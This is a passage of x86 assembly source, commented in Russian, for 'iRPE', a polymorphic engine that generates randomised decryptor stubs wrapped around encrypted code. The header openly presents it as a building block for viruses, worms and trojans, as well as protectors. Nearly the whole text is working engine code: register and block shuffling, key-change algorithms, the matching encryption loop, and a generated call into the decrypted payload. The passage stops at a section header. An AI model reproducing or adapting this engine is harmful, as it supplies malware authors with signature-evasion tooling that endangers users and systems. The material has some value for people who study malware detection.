;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                           			 ;
;                                                                                                 		 ;
;                                                                                                    	 ;
;                          xxxxxxxxxxxxx     xxxxxxxxxxxxx     xxxxxxxxxxxxxxx                           ;
;                          xxxxxxxxxxxxxx    xxxxxxxxxxxxxx    xxxxxxxxxxxxxxx                           ;
;                          xxxxxxxxxxxxxxx   xxxxxxxxxxxxxxx   xxxxxxxxxxxxxxx                           ;
;                          xxxxx     xxxxx   xxxxx     xxxxx   xxxxx                                     ;
;                  xxxxx   xxxxx     xxxxx   xxxxx     xxxxx   xxxxx                                     ;
;                  xxxxx   xxxxx     xxxxx   xxxxx     xxxxx   xxxxx                                     ;
;                  xxxxx   xxxxxxxxxxxxxxx   xxxxxxxxxxxxxxx   xxxxxxxxxxxxx                             ;
;                  xxxxx   xxxxxxxxxxxxxx    xxxxxxxxxxxxxx    xxxxxxxxxxxxx                             ;
;                  xxxxx   xxxxxxxxxxxxx     xxxxxxxxxxxxx     xxxxxxxxxxxxx                             ;
;                  xxxxx   xxxxx    xxxxx    xxxxx             xxxxx                                     ;
;                  xxxxx   xxxxx     xxxxx   xxxxx             xxxxx                                     ;
;                          xxxxx     xxxxx   xxxxx             xxxxx                                     ;
;                  xxxxx   xxxxx     xxxxx   xxxxx             xxxxxxxxxxxxxxx                           ;
;                  xxxxx   xxxxx     xxxxx   xxxxx             xxxxxxxxxxxxxxx                           ;
;                  xxxxx   xxxxx     xxxxx   xxxxx             xxxxxxxxxxxxxxx                           ;
;																										 ;
;																										 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;									It's Real Polymorph Engine											 ;
;											 iRPE														 ;
;											irpe.asm													 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											  =)!													 	 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											 iRPE														 ;
;								Реальный Полиморфный двигатель iRPE										 ;
;																										 ;
;ВХОД (stdcall: DWORD iRPE(DWORD xparam)):																 ;
;	xparam				-	адрес структуры IRPE_POLYMORPH_GEN											 ; 
;--------------------------------------------------------------------------------------------------------;
;ВЫХОД:																									 ;
;	(+)					-	сгенерированный полиморфный декриптор(ы) с зашифрованным кодом				 ; 
;	(+)					-	заполненные выходные поля структуры IRPE_POLYMORPH_GEN						 ;
;	EAX					-	адрес (в буфере) сгенерированного декриптора (+ шифрованного кода)			 ; 
;--------------------------------------------------------------------------------------------------------;
;ЗАМЕТКИ:																								 ;
;	(+)					-	входные поля структуры IRPE_POLYMORPH_GEN после отработки движка остаются 	 ;
;							теми же, что и перед вызовом - не портятся; 								 ;
;	(+)					-	если структуры будут изменяться, то делать их размер кратный 4;				 ;
;	(+)					-	данный двиг нужен для генерации полиморфного декриптора, а также для 		 ;
;							шифрования некоторого кода(данных) для последующей его дешифровки. Может 	 ;
;							применяться как	самостоятельный движок (есть условия), так и, например, 	 ;
;							вместе с трэшгеном для построения различного кода (хаоса, реалистичного и 	 ;
;							т.д., вирусы/черви/трояны), программ (навесные заshit'ы) etc; 				 ;
;	(+)					-	двиг состоит условно из 2-х файлов: xtg.inc & irpe.asm. Первый файл - 		 ;
;							заголовочник. В нём найдёшь все необходимые структуры etc, и их краткие 	 ;
;							описания. 2 файл - сама реализация движка iRPE. 			 				 ;
;							Далее по коментам будет детальная описуха всех полей всех нужных структур	 ; 
;	(+)					-	в коментах есть суть, неточности можете кому-нить подарить;					 ;
;	(+)					-	может что-то ещё xD;														 ; 
;--------------------------------------------------------------------------------------------------------; 
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;										Скелет декриптора												 ;
;																										 ;
;																										 ;
;		mov		eax, 00405000h																			 ;
;		mov		ecx, 5DEB9A17h																			 ;
;		xor		dword ptr [eax], ecx  <-+																 ;
;		inc		ecx                     |																 ;
;		dec		eax                     |																 ;
;		cmp		eax, 401000h            |																 ;
;		jae		------------------------+																 ;
;		mov		edx, 401000h																			 ;
;		call	edx																						 ;
;																										 ;
;																										 ;
;[!]:	команды, их расположение и вызовы, регистры и т.п. - всё это меняется;							 ; 
;[+]:	каждая из этих команд - это блок декриптора. Например, первая команда декриптора может быть 	 ;
;		такой:																							 ;
;			push	75h																					 ;
;			pop		eax																					 ;
;			add		eax, 00404F8Bh		;75h + 404F8Bh = 405000h;										 ;
;		Тогда (в данном примере) для инициализации рега1 будет уже 2 блока декриптора:					 ;
;			1-ый блок: push/pop																			 ;
;			2-ой блок: add																				 ; 
;etc; 																									 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;v1.0

	

																		;m1x
																		;pr0mix@mail.ru
																		;EOF 






 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa iRPE
;это и есть наш двигл (внешняя функа);
;ВХОД (stdcall IRPE(DWORD xparam)):
;	xparam					-	адрес структуры IRPE_POLYMORPH_GEN
;ВЫХОД:
;	(+)						-	сгенерированный декриптор с зашифрованным кодом
;	(+)						-	заполненные выходные поля структуры IRPE_POLYMORPH_GEN
;	EAX						-	адрес созданного декриптора (с шифрованным кодом); 
;	(!) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
irpe_struct1_addr			equ		dword ptr [ebp + 24h]				;addr of IRPE_POLYMORPH_GEN

irpe_save_buffer_addr		equ		dword ptr [ebp - 04]				;сохраним адрес вспомогательного буфера (выделили), в котором будем генерить декриптор(ы) и сохранять шифрованный код(ы); 

iRPE:
	pushad																;поехали!
	mov		ebp, esp
	sub		esp, 08
	cld
	xor		edx, edx
	mov		ebx, irpe_struct1_addr
	assume	ebx: ptr IRPE_POLYMORPH_GEN
	mov		esi, [ebx].xtg_struct_addr
	assume	esi: ptr XTG_TRASH_GEN

	cmp		[ebx].decryptor_size, DECRYPTOR_MIN_SIZE					;если переданный размер меньше минимального, то выходим 
	jl		_irpe_ret_

	push	IRPE_ALLOC_BUFFER
	call	[esi].alloc_addr											;выделяем буфер для генерации декриптора(ов)
	mov		irpe_save_buffer_addr, eax									;сохраним полученный адрес (или 0) в данной переменной

	test	eax, eax													;если выделить буфер не получилось, тогда на выход!
	je		_irpe_ret_
	xchg	eax, edx													;иначе, сохраним адрес выделенной только что памяти в реге EDX;

;--------------------------------------------------------------------------------------------------------

	push	(DECRYPTOR_MAX_NUM - 01)									;при мультидекрипторности, делаем так, чтобы обязательно сгенерировались хотя бы 2 декриптора: 1 простой + 1 финальный декриптор; (поэтому DECRYPTOR_MAX_NUM должен быть >= 2); 
	call	[esi].rang_addr

	lea		ecx, dword ptr [eax + 01]									;в ECX - число - сколько (простых) декрипторов генерировать; 

	;mov		ecx, 04													;for test; 

	push	[esi].tw_trash_addr											;сохраним в стеке данные поля, так как сейчас их будем изменять
	push	[esi].trash_size
	push	[esi].icb_struct_addr
	push	[ebx].code_addr
	push	[ebx].va_code_addr
	push	[ebx].code_size 

	mov		eax, [ebx].decryptor_size
	mov		[esi].trash_size, eax										;теперь поле trash_size = размеру одного декриптора; 

	test	[ebx].xmask, IRPE_MULTIPLE_DECRYPTOR						;можно ли делать мультидекрипторность?
	je		_irpe_final_decryptor_ 										;если нет, тогда сразу переходим на генерацию финального и единственного декриптора;

	push	[esi].fmode													;иначе, также сохраним значения и этих полей;
	push	[esi].xmask1
	push	[esi].xmask2
	push	[ebx].xmask

	and		[ebx].xmask, 0												;сбрасываем маску (указываем, что нам не нужно в этих декрипторах генерировать вызов (call) на расшифрованный код);
	
	imul	eax, ecx													;тут фишка такая: мы не юзаем в декрипторе конструкции с дельта-оффсетом. Поэтому нам нужен VA, указывающий на шифрованный/расшифрованный код;
																		;если мы юзаем мультидекрипторность, то все декрипторы у нас будут одного и того же размера - это нормуль. 
																		;А значит мы можем посчитать для всех декрипторов правильные VA, отталкиваясь от поля va_code_addr (если, например, нам нужно посчитать VA для 3-его декриптора, то к полю va_code_addr мы прибавим размер декриптора (trash_size) 3 раза, так-то ёба!); 
	add		[ebx].va_code_addr, eax										;а вот, собственно говоря, само сложение;

	mov		[esi].fmode, XTG_MASK										;указываем режим генерации XTG_MASK (чтобы точно сгенерировались все переданные байты - это важно для того, чтобы декрипторы были точно одного и того же размера);
	mov		[esi].xmask1, XTG_ON_XMASK									;и указываем, что можно генерить любые команды;
	mov		[esi].xmask2, XTG_ON_XMASK									; 

;--------------------------------------------------------------------------------------------------------

_irpe_multi_decryptor_:													;генерация простых декрипторов;
	mov		[esi].tw_trash_addr, edx									;указываем, где записать генерируемый декриптор с последующим за ним шифрованным кодом;

	push	ebx															;IRPE_POLYMORPH_GEN
	call	generate_decryptor											;генерируем декриптор и записываем сразу после него зашифрованный код/данные; 

	test	eax, eax													;если сгенерить не получилось, тогда выходим
	je		_irpe_bs_1_ 

	mov		edx, eax													;иначе, edx - теперь хранит адрес, который находится сразу за шифрованным кодом
	sub		eax, [esi].tw_trash_addr									;eax = размеру декриптора + шифрованный код;
	mov		[ebx].code_size, eax
	mov		eax, [esi].tw_trash_addr
	mov		[ebx].code_addr, eax										;code_addr = tw_trash_addr -> то есть мы указываем, что теперь шифрованный код - это наш созданный декриптор с оригинальным шифрованным кодом!
	mov		eax, [esi].trash_size
	sub		[ebx].va_code_addr, eax										;ну и корректируем va_code_addr (читай сорцы!); 

	dec		ecx															;переходим к генерации очередного декриптора;
	jne		_irpe_multi_decryptor_

;--------------------------------------------------------------------------------------------------------

_irpe_bs_1_:
	pop		[ebx].xmask													;восстанавливаем данные поля, так как сейчас будем генерировать финальный, качественный декриптор; он же будет вызываться самым первым для последующей расшифровки других декрипторов и т.п.; 
	pop		[esi].xmask2												;т.е. стартовый декриптор;
	pop		[esi].xmask1
	pop		[esi].fmode

	test	eax, eax													;если eax = 0, значит что-то ранее не получилось сгенерировать, идём на выход;
	je		_irpe_free_1_

_irpe_final_decryptor_:													;генерация финального декриптора;
	mov		[esi].tw_trash_addr, edx

	push	ebx
	call	generate_decryptor											;создаём

	test	eax, eax													;если не получилось, то на выход
	je		_irpe_free_1_
	
;--------------------------------------------------------------------------------------------------------

	mov		edi, [esi].nobw												;иначе, edi = числу реально записанных байтов (по идее все байты должны записаться);
	mov		ecx, edi
	add		ecx, [ebx].code_size										;ecx = размер финального декриптора + размер шифрованного кода;

	push	ecx															;выделяем для них память
	call	[esi].alloc_addr

	test	eax, eax													;получилось?
	je		_irpe_free_1_												;если нет, то на выход
	
	mov		edx, [esi].tw_trash_addr									;иначе продолжаем; сохраняем в EDX адрес финального декриптора
	mov		[ebx].decryptor_addr, eax									;и сохраняем это значение в соответствующем поле
	mov		[esi].fnw_addr, eax
	add		[esi].fnw_addr, edi											;fnw_addr - указывает на конец финального декриптора (то есть на начало шифрованного кода);
	sub		[esi].ep_trash_addr, edx									;корректируем точку входа в декриптор с учётом адреса нового буфера;
	add		[esi].ep_trash_addr, eax
	mov		edi, [esi].ep_trash_addr
	mov		[ebx].ep_polymorph_addr, edi								;сохраняем;
	mov		edi, [esi].fnw_addr
	mov		[ebx].encrypt_code_addr, edi								;etc; 
	mov		[ebx].total_size, ecx										;сохраняем общий размер финального декриптора + размер шифрованного кода в данном поле; 
	mov		edi, eax
	push	esi
	mov		esi, edx
	rep		movsb														;записываем в новый буфер финальный декриптор с шифрованным кодом;
	pop		esi
	
	xchg	eax, edx													;edx = адрес нового буфера ака адрес финального декриптора; 
	jmp		_irpe_free_1_1_												;прыгаем дальше;

;--------------------------------------------------------------------------------------------------------

_irpe_free_1_:
	xor		edx, edx													;сюда попадаем, если что-то не получилось сгенерить;

_irpe_free_1_1_:
	pop		[ebx].code_size												;восстанавливаем ранее сохранённые поля
	pop		[ebx].va_code_addr
	pop		[ebx].code_addr
	pop		[esi].icb_struct_addr
	pop		[esi].trash_size
	pop		[esi].tw_trash_addr

	push	irpe_save_buffer_addr
	call	[esi].free_addr												;освобождаем больше ненужный буфер;
	
;--------------------------------------------------------------------------------------------------------

_irpe_ret_:	
	mov		dword ptr [ebp + 1Ch], edx 									;сохраняем в eax адрес финального декриптора (или 0, если что-то не получилось);
	mov		esp, ebp
	popad
	ret		04 															;выход;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи IRPE 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа generate_decryptor
;генерация декриптора
;ВХОД (stdcall: generate_decryptor(xparam)):
;	xparam		-	адрес IRPE_POLYMORPH_GEN
;ВЫХОД:
;	EAX			-	адрес для дальнейшей записи кода, или 0; 
;	(+)			-	сгенерированный декриптор
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
gend_struct1_addr				equ		dword ptr [ebp + 24h]			;IRPE_POLYMORPH_GEN

gend_save_blocks_addr			equ		dword ptr [ebp - 04]			;для сохраним адрес буфера, в котором хранятся блоки/структуры декриптора;
gend_tmp_var1					equ		dword ptr [ebp - 08]			;вспомогательная переменная; 

generate_decryptor:
	pushad
	mov		ebp, esp
	sub		esp, 12
	mov		ebx, gend_struct1_addr
	assume	ebx: ptr IRPE_POLYMORPH_GEN
	mov		esi, [ebx].xtg_struct_addr
	assume	esi: ptr XTG_TRASH_GEN	 
	xor		edi, edi													;edi = 0; 

	push	ebx															;IRPE_POLYMORPH_GEN
	call	generate_block_decryptor									;создаём блоки декриптора;
	mov		gend_save_blocks_addr, eax									;EAX = адрес буфера, в котором хранятся эти блоки/структурки; 

	test	eax, eax													;если не получилось сгенерить, значит выходим
	je		_gend_ret_

	mov		[esi].icb_struct_addr, eax									;иначе сохраним данный адрес в данном поле: XTG_TRASH_GEN.icb_struct_addr; т.е. указываем, что вместе с трэшкодом будем записывать и полезные команды (в данной ситуации это декриптор); 
	xchg	eax, edx
	assume	edx: ptr IRPE_CONTROL_BLOCK_STRUCT

;--------------------------------------------------------------------------------------------------------

	push	esi															;XTG_TRASH_GEN
	call	[ebx].xtg_addr												;вызываем трэшген (генерация декриптора);

	cmp		[esi].nobw, 0												;если реальное число записанных байтов = 0, значит генерация как-то не удалааась) на выход; 
	je		_gend_free_1_

	mov		edi, [edx].func_level										;иначе, сохраним номер функции (в которой был записан декриптор) 
	mov		[ebx].leave_num, edi										;в данном поле - если номер функции = 2, то значит можно вызвать 2 раза leave для балансировки стека (если это важно); 
	mov		edi, [esi].fnw_addr											;edi = адрес для дальнейшей записи (указывает на конец сгенерированного декриптора); буфдем сразу за декриптором записывать шифрованный код; 
	
;--------------------------------------------------------------------------------------------------------

	push	esi															;
	mov		esi, [ebx].code_addr										;esi = адрес шифрованного кода
	mov		ecx, [ebx].code_size										;ecx = размер шифрованного кода
	mov		ebx, [edx].main_key											;ebx = основной (он же базовый) ключ для шифровки/дешифровки
	mov		eax, [edx].slide_key										;eax = плавающий ключ
	mov		gend_tmp_var1, eax											;сохраним плавающий ключ также во вспомогательной переменной; 
	imul	eax, ecx													;так как мы вначале создали декриптор, теперь нам нужно посчитать обратный ключ для шифровки кода; 

	test	[edx].chgkey_alg, IRPE_DEC___R32							;смотрим, какой алгоритм изменения основного ключа выбран; 
	jne		_dec_sub_begin_key1_
	test	[edx].chgkey_alg, IRPE_SUB___R32__IMM32
	jne		_dec_sub_begin_key1_
	test	[edx].chgkey_alg, IRPE_SUB___R32__IMM8
	jne		_dec_sub_begin_key1_

_inc_add_begin_key1_:													;если основной ключ в декрипторе увеличивается, то и тут его увеличим, чтобы получить ключ для шифрования; 
	add		ebx, eax													
	sub		ebx, gend_tmp_var1
	jmp		_begin_crypt_

_dec_sub_begin_key1_:													;если основной ключ в декрипторе уменьшается, то и тут его уменьшаем, чтобы получить ключ для шифрования; 
	sub		ebx, eax
	add		ebx, gend_tmp_var1

_begin_crypt_:	
	lodsd																;получаем первые 4 байта для шифрования

_encrypt_cycle_:														;шифровка кода происходит с начала в конец; а расшифровка - наоборот, из конца в начало кода; 
	test	[edx].crypt_alg, IRPE_XOR___M32__R32						;;тут смотрим, какой алгоритм в декрипторе для расшифровки - и будем шифровать обратным; 
	jne		_crypt_xor_
	test	[edx].crypt_alg, IRPE_ADD___M32__R32
	jne		_crypt_sub_

_crypt_add_:
	add		eax, ebx
	jmp		_chg_key1_
_crypt_sub_:
	sub		eax, ebx
	jmp		_chg_key1_
_crypt_xor_:
	xor		eax, ebx

_chg_key1_:
	test	[edx].chgkey_alg, IRPE_DEC___R32
	jne		_inc_add_key1_
	test	[edx].chgkey_alg, IRPE_SUB___R32__IMM32
	jne		_inc_add_key1_
	test	[edx].chgkey_alg, IRPE_SUB___R32__IMM8
	jne		_inc_add_key1_

_dec_sub_key1_:															;если ключ в декрипторе увеличивается, то мы его уменьшаем в алгоритме шифровки; 
	sub		ebx, gend_tmp_var1
	jmp		_crypt_code_
_inc_add_key1_:															;если ключ в декрипторе уменьшается, то мы его увеличиваем в алгоритме шифровки;
	add		ebx, gend_tmp_var1

_crypt_code_:
	stosb																;запишем зашифрованный байт
	lodsb																;возьмём следующий байт для шифровки
	ror		eax, 08														;сделаём его в дворде последним для записи среди остальных текущих байтов; 
	dec		ecx
	jne		_encrypt_cycle_												;шифруем очередной байт; 

	pop		esi 

;--------------------------------------------------------------------------------------------------------

_gend_free_1_:
	push	gend_save_blocks_addr										;освобождаем ранее выделенную память для блоков декриптора; 
	call	[esi].free_addr

_gend_ret_:
	mov		dword ptr [ebp + 1Ch], edi									;сохраняем адрес для дальнейшей записи в eax; 
	mov		esp, ebp
	popad
	ret		04															;выходим; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи generate_decryptor
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функа generate_block_decryptor
;генерация блоков декриптора
;ВХОД (stdcall: generate_block_decryptor(xparam)): 
;	xparam		-	адрес (входной) структуры IRPE_POLYMORPH_GEN
;ВЫХОД:
;	EAX			-	адрес выделенной памяти (в которой идет первой структура IRPE_CONTROL_BLOCK_STRUCT, 
;					и сразу за ней сгенерированные структуры IRPE_BLOCK_DATA_STRUCT); либо 0; 
;	(+)			-	сгенерированные блоки (структурки); 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
irpe_gbd_struct1_addr 		equ		dword ptr [ebp + 24h]				;addr of IRPE_POLYMORPH_GEN

irpe_gbd_icbs_addr			equ		dword ptr [ebp - 04]				;addr of IRPE_CONTROL_BLOCK_STRUCT
irpe_gbd_regs				equ		dword ptr [ebp - 08]				;save generated regs
irpe_gbd_imm32				equ		dword ptr [ebp - 12]				;save imm32; 
irpe_gbd_dflag				equ		dword ptr [ebp - 16]				;тут храним число - от него зависит, какие команды декриптора будем генерить; 
irpe_gbd_vca				equ		dword ptr [ebp - 20]				;va_code_addr
irpe_gbd_codesize			equ		dword ptr [ebp - 24]				;code_size
irpe_gbd_tmp_var1			equ		dword ptr [ebp - 28]				;tmp var; 

generate_block_decryptor:
	pushad
	mov		ebp, esp
	sub		esp, 32
	mov		ebx, irpe_gbd_struct1_addr
	assume	ebx: ptr IRPE_POLYMORPH_GEN
	push	[ebx].va_code_addr											;сохраняем нужные поля во вспомогательных переменных; 
	pop		irpe_gbd_vca
	push	[ebx].code_size
	pop		irpe_gbd_codesize	
	mov		ebx, [ebx].xtg_struct_addr
	assume	ebx: ptr XTG_TRASH_GEN

	push	02
	call	[ebx].rang_addr
	mov		irpe_gbd_dflag, eax											;0 or 1; 

	mov		ecx, (sizeof (IRPE_BLOCK_DATA_STRUCT) * MNBD + sizeof (IRPE_CONTROL_BLOCK_STRUCT) + USEFUL_CODE_MAX_SIZE) 

	push	ecx															;size
	call	[ebx].alloc_addr											;выделяем память для будущих блоков декриптора, а также для хранения скелета декриптора; 
	mov		irpe_gbd_icbs_addr, eax

	test	eax, eax													;если адрес выделить не получилось, тогда выходим; 
	je		_gbd_ret_

	push	ecx															;size
	push	eax															;addr
	call	xmemset														;иначе, вначале обнулим выделенную память;

	xchg	eax, esi
	lea		ecx, dword ptr [esi + sizeof (IRPE_CONTROL_BLOCK_STRUCT)]
	lea		edi, dword ptr [esi + sizeof (IRPE_BLOCK_DATA_STRUCT) * MNBD + sizeof (IRPE_CONTROL_BLOCK_STRUCT)]
	assume	esi: ptr IRPE_CONTROL_BLOCK_STRUCT
	assume	ecx: ptr IRPE_BLOCK_DATA_STRUCT
	mov		[esi].cur_addr, ecx											;адрес текущего блока - сохраняем адрес самого первого блока; 

	call	generate_regs												;генерируем регистры (3шт?) для декриптора;
	mov		irpe_gbd_regs, eax											;сохраняем их; 

;--------------------------------------------------------------------------------------------------------

	push	02															;теперь генерим блоки декриптора;
	call	[ebx].rang_addr

	test	eax, eax													;
	je		_gbd_block_2_1_

_gbd_block_1_2_:														;мы можем местами переставить блоки 1 и 2, при этом  правильная работоспособность декриптора сохраняется; 
	call	gbd_block_1													;block_init_addr; блоки инициализации: задаются стартовый адрес для расшифровки кода и основой ключ для расшифровки кода; 
	call	gbd_block_2													;block_init_main_key;
	jmp		_gbd_block_3_

_gbd_block_2_1_:
	call	gbd_block_2													;block_init_main_key
	call	gbd_block_1													;block_init_addr

_gbd_block_3_:
	call	gbd_block_3													;block_crypt; блок расшифровки - команда расшифровки кода; 

_gbd_block_4_and_5_:	
	push	02															;также можно поменять местами блоки 4 и 5; 
	call	[ebx].rang_addr

	test	eax, eax
	je		_gbd_block_5_4_

_gbd_block_4_5_:
	call	gbd_block_4													;block_chg_main_key; блоки изменения основного ключа и изменения адреса (на -1) для расшифровки очередного байта; 
	call	gbd_block_5													;block_chg_addr
	jmp		_gbd_block_6_

_gbd_block_5_4_:
	call	gbd_block_5													;block_chg_addr
	call	gbd_block_4													;block_chg_main_key; 

_gbd_block_6_:
	call	gbd_block_6													;block_cycle; блок цикла - тут генерим констркцию сравнения адреса и последующего перехода на расшифровку очередного байта; 

_gbd_block_7_:
	mov		edx, irpe_gbd_struct1_addr 									;block_call; блок вызова - здесь проверяем по маске, можно ли генерировать команду вызова (call, 0xE8) на расшифрованный код; 
	assume	edx: ptr IRPE_POLYMORPH_GEN
	test	[edx].xmask, IRPE_CALL_DECRYPTED_CODE
	je		_gbd_ret_

	call	gbd_block_7
	
;--------------------------------------------------------------------------------------------------------

_gbd_ret_:
	mov		eax, irpe_gbd_icbs_addr 
	mov		dword ptr [ebp + 1Ch], eax									;eax = адрес выделенной памяти для блоков декриптора (ака адрес структуры IRPE_CONTROL_BLOCK_STRUCT); 
	mov		esp, ebp
	popad
	ret		04															;еа выход, товарищи! 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи generate_block_decryptor; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;далее идут различные вспомогательные функи для generate_block_decryptor
;данные функи генерируют блоки для будущего декриптора; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

;=======================[block_1 -> initialization of decryptor (address)]===============================
gbd_block_1:															;регистр1 = адресу конца шифрованного кода для последующей его расшифровки; расшифровка происходит с конца в начало; 
																		;или же 
																		;регистр1 = размеру шифрованного кода - это значение в декрипторе будет уменьшаться на 1 - то есть это индикатор расшифровки всего кода; 
	cmp		irpe_gbd_dflag, 0
	je		_gb1_n_1_
	mov		eax, irpe_gbd_codesize										;eax = размер код для расшифровки; 
	jmp		_gb1_n_2_

_gb1_n_1_:
	mov		eax, irpe_gbd_vca
	add		eax, irpe_gbd_codesize
	dec		eax															;eax = адрес последнего байта шифрованного кода; 

_gb1_n_2_:
	mov		irpe_gbd_imm32, eax

	call	gen_block_init												;инициализация регистра1; (mov reg32, imm32; push imm8  pop reg32  add reg32, imm32; etc); 
	ret
;=======================[block_1 -> initialization of decryptor (address)]===============================



;=======================[block_2 -> initialization of decryptor (main_key)]==============================
gbd_block_2:															;регистр2 = основному (базовому) ключу для расшифровки; 
	push	-1
	call	[ebx].rang_addr
	mov		irpe_gbd_imm32, eax
	mov		[esi].main_key, eax 										;делаем СЧ основным ключом; 
	
	call	gbd_xchg___reg1__reg2										;регистр2 в маске сделаем первым, а регистр1 соотв-но вторым; 

	call	gen_block_init												;инициализация регистра2;

	call	gbd_xchg___reg1__reg2										;снова поменяем регистры, т.е. поставим их обратно на свои места; 
	ret
;=======================[block_2 -> initialization of decryptor (main_key)]==============================



;===============================[block_3 -> instr of crypt code]=========================================
gbd_block_3:															;decrypt [регистр1], регистр2 
	mov		eax, irpe_gbd_vca
	dec		eax
	mov		irpe_gbd_imm32, eax											;если рег1 = размеру кода для расшифровки, тогда команда расшифровки будет такая xor/add/sub dword ptr [reg1 + <addr>], reg2; 

	call	gen_block_crypt												;расшифровка шифрованного кода =) 
	ret
;===============================[block_3 -> instr of crypt code]=========================================



;===============================[block_4 -> change of main_key]==========================================
gbd_block_4:															;изменение основного (базового) ключа (в каждой итерации); 
	push	-1
	call	[ebx].rang_addr
	mov		irpe_gbd_imm32, eax

	call	gbd_xchg___reg1__reg2										;снова меняем реги 1 и 2 местами

	call	gen_block_chgkey											;chg регистр2

	call	gbd_xchg___reg1__reg2										;и снова ставим реги обратно на свои места; 
	ret
;===============================[block_4 -> change of main_key]==========================================



;=======================[block_5 -> change of address for decrypt of code]===============================
gbd_block_5:															;уменьшаем адрес для дешифровки на -1, таким образом переходим к дешифровке очередного байта (с конца в начало); 
	push	-1
	call	[ebx].rang_addr
	mov		irpe_gbd_imm32, eax 
	
	call	gen_block_chgcnt
	ret
;=======================[block_5 -> change of address for decrypt of code]===============================



;===============================[block_6 -> cycle of decryptor]==========================================
gbd_block_6:															;проверка, расшифровали ли мы весь код или ещё нет? если нет, тогда переходим к расшифровке следующего байта; 
	push	irpe_gbd_vca
	pop		irpe_gbd_imm32

	call	gen_block_cycle
	ret
;===============================[block_6 -> cycle of decryptor]==========================================



;=============================[block_7 -> call of decrypted_code]========================================
gbd_block_7:															;генерация команды вызова (call -> 0xE8...) на расшифрованный код; 
	push	irpe_gbd_vca
	pop		irpe_gbd_imm32

	mov		edx, irpe_gbd_regs
	push	edx

	push	02															;тут случайным образом определяем, какой из регистров декриптора (один из 2-х возможных?) будет использоваться для генерации call reg32; 
	call	[ebx].rang_addr

	push	ecx
	imul	ecx, eax, 08
	shr		edx, cl
	pop		ecx

	mov		irpe_gbd_regs, edx

	call	gen_block_init												;init reg32;

	call	gen_block_call												;call reg32; 
	pop		irpe_gbd_regs
	ret
;=============================[block_7 -> call of decrypted_code]========================================



;===========================[перестановка регистра1 и регистра2 местами]=================================	
gbd_xchg___reg1__reg2:
	mov		eax, irpe_gbd_regs
	xchg	al, ah														;меняем местами рег1 и рег2; 
	mov		irpe_gbd_regs, eax
	ret
;===========================[перестановка регистра1 и регистра2 местами]=================================



;=================================[корректировка различных счётчиков]====================================
